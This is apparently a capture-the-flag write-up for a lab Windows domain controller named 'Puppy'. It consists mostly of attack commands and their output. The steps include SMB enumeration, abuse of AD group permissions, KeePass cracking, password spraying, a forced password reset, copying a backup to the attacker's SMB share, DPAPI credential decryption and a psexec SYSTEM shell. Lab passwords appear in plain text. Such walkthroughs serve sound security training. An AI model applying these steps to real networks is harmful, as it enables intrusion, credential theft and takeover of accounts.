# Puppy

Test the creds

```bash
┌──(kali㉿kali)-[~]
└─$ nxc smb puppy.htb -u 'levi.james' -p 'KingofAkron2025!'
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\\levi.james:KingofAkron2025!
```

### Nmap

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- -sV -sC -T4 puppy.htb  
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-09-23 18:19 EDT
Nmap scan report for puppy.htb (10.10.11.70)
Host is up (0.11s latency).
Not shown: 65512 filtered tcp ports (no-response)
Bug in iscsi-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-24 05:24:35Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  2,3         2049/udp   nfs
|   100005  1,2,3       2049/udp   mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100024  1           2049/tcp   status
|_  100024  1           2049/udp   status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3260/tcp  open  iscsi?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
59483/tcp open  msrpc         Microsoft Windows RPC
59512/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2025-09-24T05:26:29
|_  start_date: N/A
```

### 445 - SMB

#### Shares test

```bash
┌──(kali㉿kali)-[~]
└─$ smbmap -u 'levi.james' -p 'KingofAkron2025!' -H puppy.htb

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \\    /"  ||   _  "\\ |"  \\    /"  |     /""\\       |   __ "\\
  (:   \\___/  \\   \\  //   |(. |_)  :) \\   \\  //   |    /    \\      (. |__) :)
   \\___  \\    /\\  \\/.    ||:     \\/   /\\   \\/.    |   /' /\\  \\     |:  ____/
    __/  \\   |: \\.        |(|  _  \\  |: \\.        |  //  __'  \\    (|  /
   /" \\   :) |.  \\    /:  ||: |_)  :)|.  \\    /:  | /   /  \\   \\  /|__/ \\
  (_______/  |___|\\__/|___|(_______/ |___|\\__/|___|(___/    \\___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     <https://github.com/ShawnDEvans/smbmap>

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.11.70:445 Name: puppy.htb                 Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     NO ACCESS       DEV-SHARE for PUPPY-DEVS
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections
```

No access to anything with those creds

#### User enum

```bash
┌──(kali㉿kali)-[~]
└─$ nxc smb puppy.htb -u 'levi.james' -p 'KingofAkron2025!' --users 
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\\levi.james:KingofAkron2025! 
SMB         10.10.11.70     445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.70     445    DC               Administrator                 2025-02-19 19:33:28 0       Built-in account for administering the computer/domain 
SMB         10.10.11.70     445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.70     445    DC               krbtgt                        2025-02-19 11:46:15 0       Key Distribution Center Service Account 
SMB         10.10.11.70     445    DC               levi.james                    2025-02-19 12:10:56 0        
SMB         10.10.11.70     445    DC               ant.edwards                   2025-02-19 12:13:14 0        
SMB         10.10.11.70     445    DC               adam.silver                   2025-09-24 05:19:29 0        
SMB         10.10.11.70     445    DC               jamie.williams                2025-02-19 12:17:26 0        
SMB         10.10.11.70     445    DC               steph.cooper                  2025-02-19 12:21:00 0        
SMB         10.10.11.70     445    DC               steph.cooper_adm              2025-03-08 15:50:40 0        
SMB         10.10.11.70     445    DC               [*] Enumerated 9 local users: PUPPY
```

### Bloodhound

```bash
sudo bloodhound-python -u '<USER>' -p '<PASS>' -ns <DC_IP> -d <DOMAIN> -c all
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FqLIpJy6OFqtpNAoJLoi4%2Fimage.png?alt=media&#x26;token=b4710ad7-3176-440c-a185-cbe2f7683008" alt=""><figcaption></figcaption></figure>

Generic write ⇒ allows us to add a user to a group

Add ourself to the developers group

```bash
net rpc group addmem "Developers" "levi.james" -U "PUPPY"/"levi.james"%'KingofAkron2025!' -S puppy.htb
bloodyAD -d PUPPY --host puppy.htb -u levi.james -p 'KingofAkron2025!' add groupMember 'Developers' levi.james
```

### 445 - SMB

We now have read access on the DEV share

```bash
──(kali㉿kali)-[~]
└─$ smbmap -u 'levi.james' -p 'KingofAkron2025!' -H puppy.htb       

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \\    /"  ||   _  "\\ |"  \\    /"  |     /""\\       |   __ "\\
  (:   \\___/  \\   \\  //   |(. |_)  :) \\   \\  //   |    /    \\      (. |__) :)
   \\___  \\    /\\  \\/.    ||:     \\/   /\\   \\/.    |   /' /\\  \\     |:  ____/
    __/  \\   |: \\.        |(|  _  \\  |: \\.        |  //  __'  \\    (|  /
   /" \\   :) |.  \\    /:  ||: |_)  :)|.  \\    /:  | /   /  \\   \\  /|__/ \\
  (_______/  |___|\\__/|___|(_______/ |___|\\__/|___|(___/    \\___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     <https://github.com/ShawnDEvans/smbmap>

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.11.70:445 Name: puppy.htb                 Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     READ ONLY       DEV-SHARE for PUPPY-DEVS
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections
```

```bash
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\\\\\puppy.htb\\\\DEV -U 'levi.james%KingofAkron2025!'                              
Try "help" to get a list of possible commands.
smb: \\> ls
  .                                  DR        0  Tue Sep 23 12:34:38 2025
  ..                                  D        0  Sat Mar  8 11:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025
  Projects                            D        0  Sat Mar  8 11:53:36 2025
  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025

                5080575 blocks of size 4096. 1607104 blocks available
smb: \\> get recovery.kdbx 
getting file \\recovery.kdbx of size 2677 as recovery.kdbx (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
```

Problem cracking the pass :

```
keepass2john recovery.kdbx
! recovery.kdbx : File version '40000' is currently not supported!
```

Alternative way

```bash
┌──(kali㉿kali)-[~/Downloads/brutalkeepass]
└─$ python3 bfkeepass.py -d recovery.kdbx -w /usr/share/wordlists/rockyou.txt 
[*] Running bfkeepass
[*] Starting bruteforce process...
[!] Success! Database password: liverpool
[*] Stopping bruteforce process.
[*] Done.
```

Master password : liverpool

Open keepass using keepassxc

We find passwords

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cat pass 
HJKL2025!
Antman2025!
JamieLove2025!
ILY2025!
Steve2025!
```

Now password spraying

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb puppy.htb -u users -p pass                             
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\Administrator:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\Guest:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\krbtgt:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\levi.james:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\ant.edwards:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\adam.silver:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\jamie.williams:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\steph.cooper:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\steph.cooper_adm:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\Administrator:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\Guest:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\krbtgt:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\levi.james:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\\ant.edwards:Antman2025!
```

New creds : ant.edwards:Antman2025!

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F2lUxxmOkO8wc0QagBzxU%2Fimage.png?alt=media&#x26;token=a852cf21-bc12-4973-9847-8008d3c40c4b" alt=""><figcaption></figcaption></figure>

Ant.edwards is member of Senior dev, which have GenericAll on adam.silver

We can force change password

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD --host puppy.htb -d PUPPY -u ant.edwards -p 'Antman2025!' set password adam.silver 'Hacked123!'
[+] Password changed successfully!
```

Try to login as adam.silver

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb puppy.htb -u 'adam.silver' -p 'Hacked123!'             
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\adam.silver:Hacked123! STATUS_ACCOUNT_DISABLED
```

The account is disabled ⇒ we can enable it with bloodyAD

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD -u ant.edwards -d PUPPY -p 'Antman2025!' --host puppy.htb remove uac adam.silver -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
```

Try to login now

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb puppy.htb -u 'adam.silver' -p 'Hacked123!'                                                                 
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\\adam.silver:Hacked123!
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FzQzQlJSSG4Pox7msN1HY%2Fimage.png?alt=media&#x26;token=50f2b854-99fc-446a-92a1-d27ef96c951d" alt=""><figcaption></figcaption></figure>

Try to login to winrm

```bash
──(kali㉿kali)-[~]
└─$ nxc winrm puppy.htb -u 'adam.silver' -p 'Ipwnu0@'                                                      
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\\adam.silver:Ipwnu0@
```

Connect via WinRM

```bash
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i puppy.htb -u 'adam.silver' -p 'Ipwnu0@'
```

We find a Backups folder in C:\\

```bash
*Evil-WinRM* PS C:\\Users\\adam.silver\\Documents> cd C:\\Backups
*Evil-WinRM* PS C:\\Backups> ls 

    Directory: C:\\Backups

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip
```

We get the zip onto our attacker

```bash
──(kali㉿kali)-[~]
└─$ sudo impacket-smbserver share -smb2support .              
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.70,62345)
[*] AUTHENTICATE_MESSAGE (\\,DC)
[*] User DC\\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Closing down connection (10.10.11.70,62345)

*Evil-WinRM* PS C:\\Backups> copy site-backup-2024-12-30.zip \\\\10.10.14.44\\share\\
```

We grep for pass in the folder and get creds

```bash
┌──(kali㉿kali)-[~/puppy]
└─$ grep -ir 'pass'                                     
nms-auth-config.xml.bak:        <bind-password>ChefSteph2025!</bind-password>

──(kali㉿kali)-[~/puppy]
└─$ cat nms-auth-config.xml.bak 
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```

steph.cooper:ChefSteph2025!

Log in as that user

```bash
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i puppy.htb -u 'steph.cooper' -p 'ChefSteph2025!'
```

We upload and run winPEAS

```bash
upload winPEAS64.exe
.\\winPEAS64.exe

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
È  <https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi>
    MasterKey: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107\\556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:40:36 AM
    Modified: 3/8/2025 7:40:36 AM
   =================================================================================================

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  <https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi>
    CredFile: C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 8:14:09 AM
    Modified: 3/8/2025 8:14:09 AM
    Size: 11068
   =================================================================================================

    CredFile: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\\C8D69EBE9A43E9DEBF6B5FBD48B521B9
    Description: Enterprise Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:54:29 AM
    Modified: 3/8/2025 7:54:29 AM
    Size: 414
```

In the output, we see that we have access to dpapi keys. We know the user password so we can decrypt them

```bash
# Download the credential file

*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials> ls -h

    Directory: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9

*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials> download C8D69EBE9A43E9DEBF6B5FBD48B521B9

# Download the key file
*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect> ls 

    Directory: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         2/23/2025   2:36 PM                S-1-5-21-1487982659-1829050783-2281216199-1107

*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect> cd S-1-5-21-1487982659-1829050783-2281216199-1107
*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107> ls 
*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107> ls -h

    Directory: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-         2/23/2025   2:36 PM             24 Preferred

*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107> download 556a2412-1275-4ccf-b721-e6a0b4f90407

```

Decrypt the key

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid 'S-1-5-21-1487982659-1829050783-2281216199-1107'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Password:
Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

Decrypt the credential file

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key '0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

steph.cooper\_adm:FivethChipOnItsWay2025!

Log in as the user

```bash
┌──(kali㉿kali)-[~/puppy]
└─$ nxc smb puppy.htb -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!' 
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\\steph.cooper_adm:FivethChipOnItsWay2025! (Pwn3d!)

┌──(kali㉿kali)-[~/puppy]
└─$ impacket-psexec PUPPY/steph.cooper_adm:'FivethChipOnItsWay2025!'@puppy.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on puppy.htb.....
[*] Found writable share ADMIN$
[*] Uploading file TlGzHsve.exe
[*] Opening SVCManager on puppy.htb.....
[*] Creating service wllw on puppy.htb.....
[*] Starting service wllw.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

C:\\Windows\\system32> whoami
nt authority\\system
```
